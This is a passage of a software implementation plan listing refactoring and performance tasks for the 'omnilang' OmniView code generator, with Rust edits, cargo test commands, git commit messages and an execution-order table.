Found by AI Engineer in 2026-07-29 v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 11: Cache component root element in event prop dispatch

**Files:**
- Modify: `omnilang/src/codegen/omniview/store.rs:241-251`

**Interfaces:**
- Produces: Cached element reference pattern in generated JS event functions
- Consumes: Component event prop dispatch functions (e.g., `MyComp_onChange`)

**Background:** Component event prop functions call `document.querySelector('[data-component="MyComp"]')` on every dispatch. For high-frequency events (scroll, mousemove), this causes layout thrashing. Found by TypeScript/React Specialist (MEDIUM).

- [ ] **Step 1: Add element caching to generated event dispatch functions**

Replace lines 241-251 in `store.rs`:

```rust
let _ = writeln!(self.js, "function {}(...args) {{", prefixed_name);
let _ = writeln!(
    self.js,
    "  var el = {0}._el || ({0}._el = document.querySelector('[data-component=\"{1}\"]'));",
    prefixed_name, name
);
let _ = writeln!(self.js,
    "  if (el) el.dispatchEvent(new CustomEvent('{}', {{ detail: args.length <= 1 ? args[0] : args, bubbles: false }}));",
    dom_event
);
self.js.push_str("}\n");
```

- [ ] **Step 2: Run tests**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -20
```

- [ ] **Step 3: Commit**

```bash
git add omnilang/src/codegen/omniview/store.rs
git commit -m "perf(omniview): cache component root element in event prop dispatch

Replace per-call document.querySelector with lazy-cached element
reference on the function object itself (_el property). Eliminates
repeated synchronous DOM queries for high-frequency events like
scroll and mousemove.

Found by TypeScript/React Specialist in 2026-07-29 v2 review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 12: Remove UiCodegen dead code

**Files:**
- Modify: `omnilang/src/codegen/omniview/mod.rs:711-734` (remove impl)
- Modify: `omnilang/src/codegen/omniview/mod.rs:30` (remove use import)
- Modify: `omnilang/src/codegen/react/mod.rs` (remove impl, if present)
- Modify: `omnilang/src/codegen/vue/mod.rs` (remove impl, if present)

**Interfaces:**
- Removes: `impl UiCodegen for OmniViewGenerator`, `impl UiCodegen for ReactGenerator`, `impl UiCodegen for VueGenerator`
- Preserves: Trait definition in `crates/omnilang-core` (keep if integration planned within 2 sprints)

**Background:** `UiCodegen` trait + 3 implementations = ~120 lines of dead code with zero call sites. OmniView's `generate_component_code` re-runs the full pipeline if ever called (O(n²) trap). Found by Pragmatic Enforcer and Compiler Architect (2×MEDIUM).

- [ ] **Step 1: Remove OmniView UiCodegen impl**

In `mod.rs`, remove lines 711-734 (the `impl UiCodegen for OmniViewGenerator` block). Also remove the `use crate::codegen::shared::ui_codegen::UiCodegen;` import at line 30.

- [ ] **Step 2: Remove React and Vue UiCodegen impls**

Check `react/mod.rs` and `vue/mod.rs` for similar `impl UiCodegen` blocks. Remove them.

- [ ] **Step 3: Verify compilation**

```bash
cargo check -p omnilang 2>&1 | tail -10
```

- [ ] **Step 4: Run tests**

```bash
cargo test -p omnilang 2>&1 | tail -20
```

- [ ] **Step 5: Commit**

```bash
git add omnilang/src/codegen/omniview/mod.rs omnilang/src/codegen/react/mod.rs omnilang/src/codegen/vue/mod.rs
git commit -m "refactor(omniview): remove dead UiCodegen trait implementations

Remove ~120 lines of dead UiCodegen impl code across OmniView, React,
and Vue backends. The trait has zero call sites and its OmniView impl
re-runs the full generate() pipeline — an O(n^2) trap if ever wired.

Keep trait definition in omnilang-core for planned multi-target
component generation integration.

Found by Pragmatic Enforcer and Compiler Architect in 2026-07-29 v2
architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 13: Move `finalize_js()` inline, rehome `emit_conditional_html`

**Files:**
- Modify: `omnilang/src/codegen/omniview/store.rs:501-504` (remove `finalize_js`)
- Modify: `omnilang/src/codegen/omniview/mod.rs:388` (inline the IIFE close)
- Modify: `omnilang/src/codegen/omniview/editor.rs:122-269` (move `emit_conditional_html`)
- Create: `omnilang/src/codegen/omniview/view/conditional.rs` (new home)

**Interfaces:**
- Removes: `finalize_js()` method from store.rs
- Adds: `emit_conditional_html()` to `view/conditional.rs`
- Modifies: `view/mod.rs` — add `mod conditional;` and `pub(super) use conditional::*;`

**Background:** `finalize_js()` is a 3-line method in `store.rs` that just pushes `\n})();\n` — misplaced. `emit_conditional_html()` (148 lines of view rendering logic) lives in `editor.rs` with editor bridge code. Found by Pragmatic Enforcer (MEDIUM + LOW).

- [ ] **Step 1: Remove `finalize_js` and inline at call site**

In `mod.rs:388`, replace `gen.finalize_js();` with:
```rust
gen.js.push_str("\n})();\n");
```

Remove the `finalize_js` method from `store.rs:501-504`.

- [ ] **Step 2: Move `emit_conditional_html` to new file**

Create `view/conditional.rs`:
```rust
//! Live-mode conditional rendering: @if / @else-if / @else.
//! Generates HTML wrapper divs + reactive JS effects.
//! The css_only counterpart lives in view/condition.rs.

use super::super::OmniViewGenerator;
use crate::ir::*;
use std::fmt::Write;

impl OmniViewGenerator {
    // ... paste emit_conditional_html and render_branch_body here
}
```

Move `emit_conditional_html` and its helper `render_branch_body` from `editor.rs:117-269` to this new file.

In `view/mod.rs`, add:
```rust
mod conditional;
```

And ensure the method is accessible — it's called from `view_to_html` in `view/mod.rs:205` which is already in `impl OmniViewGenerator`.

Remove the moved code from `editor.rs`.

- [ ] **Step 3: Verify compilation and run tests**

```bash
cargo check -p omnilang 2>&1 | tail -10
cargo test -p omnilang -- omniview 2>&1 | tail -20
```

- [ ] **Step 4: Commit**

```bash
git add omnilang/src/codegen/omniview/store.rs omnilang/src/codegen/omniview/mod.rs omnilang/src/codegen/omniview/editor.rs omnilang/src/codegen/omniview/view/conditional.rs omnilang/src/codegen/omniview/view/mod.rs
git commit -m "refactor(omniview): inline finalize_js, rehome emit_conditional_html

Move finalize_js 3-line body inline into generate() — was misplaced in
store.rs with no relation to store signals. Move emit_conditional_html
(148 lines of view rendering) from editor.rs to new view/conditional.rs
alongside its css_only counterpart in view/condition.rs.

Found by Pragmatic Enforcer in 2026-07-29 v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 14: Pre-build design class name HashSet

**Files:**
- Modify: `omnilang/src/codegen/omniview/mod.rs:310-325` (build set during design emission)
- Modify: `omnilang/src/codegen/omniview/view/element.rs:240-262` (use set instead of linear scan)

**Interfaces:**
- Adds: `design_class_names: FxHashSet<String>` field to `OmniViewGenerator`
- Consumes: Replaces `O(n*m)` linear scan with `O(1)` set lookup in `emit_element_props`

**Background:** For each element's each class name, the code does a linear scan of all design blocks' all classes. 10 class names × 50 elements × 100 design classes = 50,000 string comparisons per codegen. Found by Performance Specialist and Compiler Architect (2×MEDIUM).

- [ ] **Step 1: Add field to Generator struct**

In `mod.rs`, add to the `OmniViewGenerator` struct:
```rust
design_class_names: FxHashSet<String>,
```

Initialize in the constructor (line 181-227):
```rust
design_class_names: FxHashSet::default(),
```

- [ ] **Step 2: Populate during design emission**

In `design.rs`, in `emit_design_css` (or in `generate()` after design emission), build the set:
```rust
for design in ir.all_designs() {
    for class in &design.classes {
        gen.design_class_names.insert(class.name.clone());
    }
}
```

- [ ] **Step 3: Replace linear scan with set lookup**

In `view/element.rs:240-262`, replace:
```rust
let in_design = self.design_map.values().any(|d| d.classes.iter().any(|c| c.name == *class_name));
```

With:
```rust
let in_design = self.design_class_names.contains(class_name);
```

- [ ] **Step 4: Run tests**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -20
```

- [ ] **Step 5: Commit**

```bash
git add omnilang/src/codegen/omniview/mod.rs omnilang/src/codegen/omniview/design.rs omnilang/src/codegen/omniview/view/element.rs
git commit -m "perf(omniview): pre-build design class name HashSet

Replace O(n*m) class name validation scan with O(1) HashSet lookup.
Build FxHashSet of all design class names once during initialization
instead of linear-scanning all design blocks per element per class.

Found by Performance Specialist and Compiler Architect in 2026-07-29
v2 architecture review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 15: Propagate source span length

**Files:**
- Modify: `omnilang/src/codegen/omniview/view/element.rs:614-628`

**Interfaces:**
- Consumes: `el.source_span: Option<Span>` (has `line`, `col`, `len` fields)
- Produces: `SourceSpan` with correct `len` instead of hardcoded `0`

**Background:** Source span `len` is hardcoded to 0, discarding the actual length from the IR's `Span`. Editor highlight/selection accuracy depends on this. Found by Compiler Architect (MEDIUM).

- [ ] **Step 1: Propagate span length**

In `element.rs:614-628`, change:
```rust
omni_span: SourceSpan {
    line: el.source_span.map_or(0, |s| s.line),
    col: el.source_span.map_or(0, |s| s.col),
    len: 0,  // <-- hardcoded
},
```

To:
```rust
omni_span: SourceSpan {
    line: el.source_span.map_or(0, |s| s.line),
    col: el.source_span.map_or(0, |s| s.col),
    len: el.source_span.map_or(0, |s| s.len),
},
```

- [ ] **Step 2: Run tests**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -20
```

- [ ] **Step 3: Commit**

```bash
git add omnilang/src/codegen/omniview/view/element.rs
git commit -m "fix(omniview): propagate source span length to SourceMap entries

Replace hardcoded len: 0 with actual span length from IR's Span.
Source span length is necessary for editor highlight/selection range
accuracy when mapping generated elements back to .omni source.

Found by Compiler Architect (Dr. Lin Wei) in 2026-07-29 v2 review.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

### Task 16: Run full test suite and clippy

- [ ] **Step 1: Run full OmniView test suite**

```bash
cargo test -p omnilang -- omniview 2>&1 | tail -30
```

Expected: all 800+ tests pass. Accept any snapshot updates with `cargo insta review` and verify diffs look correct.

- [ ] **Step 2: Run clippy**

```bash
cargo clippy -p omnilang -- -D warnings 2>&1 | tail -20
```

Expected: zero warnings.

- [ ] **Step 3: Run full workspace tests**

```bash
cargo test --workspace 2>&1 | tail -30
```

- [ ] **Step 4: Create ADR-026**

Create `.architecture/decisions/adrs/ADR-026-omniview-review-v2-fixes.md` documenting:
1. Phase guard pattern (Task 5)
2. Runtime sanitization functions (Tasks 4, 7)
3. Error severity taxonomy (Task 10)
4. @for state save/restore pattern (Task 3)
5. Event listener deduplication (Task 8)
6. UiCodegen trait removal (Task 12)

- [ ] **Step 5: Final commit**

```bash
git add .architecture/decisions/adrs/ADR-026-omniview-review-v2-fixes.md
git commit -m "docs: create ADR-026 for OmniView review v2 fix decisions

Documents architectural decisions from 16-task remediation:
phase guards, runtime sanitization, error severity taxonomy,
@for state save/restore, event listener dedup, UiCodegen removal.

Co-Authored-By: Claude <noreply@anthropic.com>"
```

---

## Execution Order

Tasks are ordered by dependency and risk:

| Order | Task | Effort | Depends On | Risk |
|-------|------|--------|------------|------|
| 1 | Task 2: Boolean attribute detection | S | None | Changes dynamic binding detection path |
| 2 | Task 3: Nested @for buffer fix | S | None | Save/restore pattern, zero risk |
| 3 | Task 1: Mutation inline codegen | S | None | Changes `&self` → `&mut self` on 2 methods |
| 4 | Task 5: Phase assertion guards | S | Tasks 1-3 (guards after code changes) | Debug-only, zero release impact |
| 5 | Task 4: URL sanitization | S | Task 2 (same element.rs region) | Adds runtime function |
| 6 | Task 6: CSP meta tag | S | None | Snapshot updates |
| 7 | Task 7: CSS sanitization | S | None | Snapshot updates |
| 8 | Task 10: Error severity | S | None | All call site context strings change |
| 9 | Task 11: Event prop caching | XS | None | Generated JS pattern change |
| 10 | Task 14: Design class HashSet | S | None | Pure optimization |
| 11 | Task 15: Source span length | XS | None | One-line fix |
| 12 | Task 8: Event listener dedup | M | Tasks 1-11 (must pass before refactor) | Pure refactor, output must be identical |
| 13 | Task 9: Eval guard | S | None | Generated JS pattern change |
| 14 | Task 12: Remove UiCodegen | S | None | Dead code removal |
| 15 | Task 13: Rehome conditional/finalize | S | Task 12 (same mod.rs region) | Pure refactor |
| 16 | Task 16: Final verification + ADR | M | All tasks | Documentation only |

**Parallelizable**: Tasks 1-7 can run in parallel (touch different files). Tasks 8-15 are serial due to Touching same files as earlier tasks.

**Total estimated effort**: ~3-4 hours for all 16 tasks (14 S/XS + 2 M).
